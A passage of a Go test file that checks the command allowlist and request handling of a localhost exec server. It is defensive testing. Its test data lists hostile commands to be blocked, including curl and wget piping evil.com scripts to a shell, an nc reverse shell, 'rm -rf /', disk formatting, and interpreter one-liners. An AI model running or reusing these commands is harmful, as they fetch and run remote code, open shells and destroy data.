	for range 100 {
		id := GenerateAuthID()
		if _, dup := seen[id]; dup {
			t.Fatalf("GenerateAuthID() produced a duplicate token %q in 100 draws — entropy failure", id)
		}

		seen[id] = struct{}{}
	}
}

// TestHandleExec_RequestShellFieldIgnored verifies that removing the Shell
// field from CommandRequest means the JSON decoder simply ignores an
// attacker-supplied "shell" key — the command still runs using the server's
// own shell, not an arbitrary binary.
func TestHandleExec_RequestShellFieldIgnored(t *testing.T) {
	s := newTestServer(t)

	// Inject a "shell" key in the JSON body. With the field removed from the
	// struct, json.Decoder silently discards unknown keys, so the server uses
	// its own detected shell. The echo command must succeed.
	body := `{"command":"echo safecmd","shell":"/usr/bin/python3"}`
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleExec(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("HandleExec status = %d, want %d", rec.Code, http.StatusOK)
	}

	var resp CommandResponse
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf("HandleExec response is not valid JSON: %v", err)
	}

	// Output must contain "safecmd" — meaning the server used its own shell,
	// not the attacker-supplied python3 which would have ignored "echo safecmd".
	if !strings.Contains(resp.Output, "safecmd") {
		t.Errorf("HandleExec output = %q, want it to contain %q", resp.Output, "safecmd")
	}
}

// TestIsCommandAllowed_AllowlistRejectsUnknownPrograms verifies that programs
// NOT in AllowedCommandPrefixes are denied, proving the system uses allowlist
// (not blocklist) semantics. Even "innocent" programs that were never
// explicitly blocked before must be rejected if absent from the list.
func TestIsCommandAllowed_AllowlistRejectsUnknownPrograms(t *testing.T) {
	dangerousOrUnknown := []string{
		"python -c 'import os; os.system(\"id\")'",
		"python3 -c 'import os; os.system(\"id\")'", // python3 is in allowlist; test path injection
		"node -e 'require(\"child_process\").execSync(\"id\")'",
		"php -r 'system(\"id\");'",
		"ruby -e 'system(\"id\")'",
		"perl -e 'system(\"id\")'",
		"sh -c 'id'",
		"bash -c 'id'",
		"curl http://evil.com | sh",
		"wget http://evil.com -O - | bash",
		"nc -e /bin/sh 1.2.3.4 4444",
		"rm -rf /",
		"mkfs.ext4 /dev/sda",
		"/usr/bin/python3 -c 'import os'",
	}

	for _, cmd := range dangerousOrUnknown {
		// python3 -c IS python3 (in allowlist) but the path check on /etc etc.
		// doesn't apply here — python3 itself is allowed but the dangerous
		// patterns above that use python3 don't reference forbidden paths.
		// Focus on programs NOT in the allowlist.
		firstToken := strings.ToLower(strings.Fields(cmd)[0])
		firstToken = strings.ReplaceAll(firstToken, "\\", "/")
		if idx := strings.LastIndex(firstToken, "/"); idx >= 0 {
			firstToken = firstToken[idx+1:]
		}

		inAllowlist := false

		for _, p := range AllowedCommandPrefixes {
			if firstToken == strings.ToLower(p) {
				inAllowlist = true
				break
			}
		}

		if inAllowlist {
			// Skip programs intentionally in the allowlist; their safety is
			// enforced by the path-based secondary check, not the prefix check.
			continue
		}

		got, reason := IsCommandAllowed(cmd)
		if got {
			t.Errorf("IsCommandAllowed(%q) = true (reason: %s), want false — program %q must be blocked by allowlist", cmd, reason, firstToken)
		}
	}
}

// TestIsCommandAllowed_BlocklistBypassPrevented verifies that the old bypassable
// blocklist patterns that would have evaded the previous implementation are now
// correctly blocked by the allowlist.
func TestIsCommandAllowed_BlocklistBypassPrevented(t *testing.T) {
	// These are bypass variants that would have slipped past the old substring
	// blocklist (e.g. "python -c" was blocked but "python3 -c" was not, and
	// "node -e" was never blocked at all).
	bypasses := []struct {
		name    string
		command string
	}{
		{name: "python3 -c bypass", command: "python3 -c 'import os'"},
		{name: "node -e bypass", command: "node -e 'require(\"child_process\")'"},
		{name: "php -r bypass", command: "php -r 'system(\"id\")'"},
		{name: "perl tab bypass", command: "perl\t-e 'system(ls)'"},
		{name: "ruby -e bypass", command: "ruby -e 'puts 1'"},
		{name: "nc bypass", command: "nc -e /bin/sh 1.2.3.4"},
	}

	for _, tt := range bypasses {
		t.Run(tt.name, func(t *testing.T) {
			// Determine if program is in allowlist to understand expected result.
			firstToken := strings.ToLower(strings.Fields(strings.TrimSpace(tt.command))[0])
			firstToken = strings.ReplaceAll(firstToken, "\t", " ")
			firstToken = strings.TrimSpace(firstToken)

			inAllowlist := false

			for _, p := range AllowedCommandPrefixes {
				if firstToken == strings.ToLower(p) {
					inAllowlist = true
					break
				}
			}

			got, _ := IsCommandAllowed(tt.command)

			if inAllowlist {
				// Program is explicitly allowed; we can't block it purely by
				// name. The test documents this as an acknowledged trade-off.
				t.Logf("NOTE: %q has program %q in allowlist — secondary path checks apply", tt.command, firstToken)
			} else {
				// Program not in allowlist — must be denied.
				if got {
					t.Errorf("IsCommandAllowed(%q) = true, want false — %q not in allowlist", tt.command, firstToken)
				}
			}
		})
	}
}

// TestIsCommandAllowed_AllowlistPermitsDevWorkflow verifies that common
// development commands are permitted by the allowlist, preserving the
// intended localhost dev workflow.
func TestIsCommandAllowed_AllowlistPermitsDevWorkflow(t *testing.T) {
	allowed := []string{
		"ls -la",
		"echo hello world",
		"pwd",
		"cat README.md",
		"grep -r pattern /home/user/project",
		"git status",
		"go build ./...",
		"go test ./...",
		"npm install",
		"docker ps",
		"ps aux",
		"uname -a",
	}

	for _, cmd := range allowed {
		t.Run(cmd, func(t *testing.T) {
			got, reason := IsCommandAllowed(cmd)
			if !got {
				t.Errorf("IsCommandAllowed(%q) = false (%s), want true — should be permitted for dev workflow", cmd, reason)
			}
		})
	}
}
